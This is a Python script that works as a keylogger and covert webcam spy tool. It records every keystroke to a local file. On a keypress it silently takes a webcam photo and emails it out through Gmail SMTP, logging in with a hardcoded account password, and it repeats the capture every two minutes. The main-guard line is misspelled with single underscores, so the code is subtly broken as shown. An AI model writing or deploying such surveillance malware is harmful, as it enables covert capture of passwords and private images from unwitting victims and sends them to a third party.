import smtplib
from email.message import EmailMessage
from pynput import keyboard
import cv2
import threading
import time

photo_captured =False  # Set to true by default

def email_alert(subject, body, to, attachment=None):
    msg = EmailMessage()
    msg.set_content(body)
    msg['subject'] = subject
    msg['to'] = to
    user = "xyz@gmail.com"
    msg['from'] = user

    password = "otwa jouc utqn gohq"
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(user, password)

    if attachment:
        with open(attachment, 'rb') as f:
            file_data = f.read()
            file_name = attachment.split('/')[-1]  # Extracting filename
        msg.add_attachment(file_data, maintype='image', subtype='jpg',
filename=file_name)

    server.send_message(msg)
    server.quit()

def keyPressed(key):
    
    global photo_captured
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error")

    if not photo_captured:
        photo_path = take_photo()
        if photo_path:
            email_alert("Photo Alert", "A photo was captured","xyz@gmail.com", photo_path)
            photo_captured = True

def take_photo():
    # Access the camera
    camera = cv2.VideoCapture(0)

    # Check if the camera is opened successfully
    if not camera.isOpened():
        print("Error: Could not open camera.")
        return None

    # Capture a photo
    ret, frame = camera.read()

    # Release the camera
    camera.release()

    # Save the captured photo
    if ret:
        cv2.imwrite("captured_photo.jpg", frame)
        print("Photo captured successfully.")
        return "captured_photo.jpg"  # Returning the path of the captured photo
    else:
        print("Error: Failed to capture photo.")
        return None

def reset_photo_captured():
    global photo_captured
    while True:
        time.sleep(120)  # Sleep for 2 minutes
        photo_captured = False

if _name_ == "_main_":
    # Start a thread to reset photo_captured variable every 2 minutes
    reset_thread = threading.Thread(target=reset_photo_captured)
    reset_thread.daemon = True  # Daemonize the thread so it exits when main program exits
    reset_thread.start()

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()

    input("Press Enter to exit...")